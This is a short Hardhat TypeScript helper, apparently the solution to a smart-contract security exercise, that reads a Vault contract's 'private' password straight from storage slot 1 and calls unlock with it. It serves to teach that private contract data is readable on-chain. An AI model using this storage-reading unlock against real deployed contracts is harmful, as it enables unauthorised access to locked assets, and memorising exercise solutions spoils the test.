import { ethers } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  const pw = await ethers.provider.getStorageAt(victim.address, 1);
  await victim.unlock(pw);
};

export default helper;
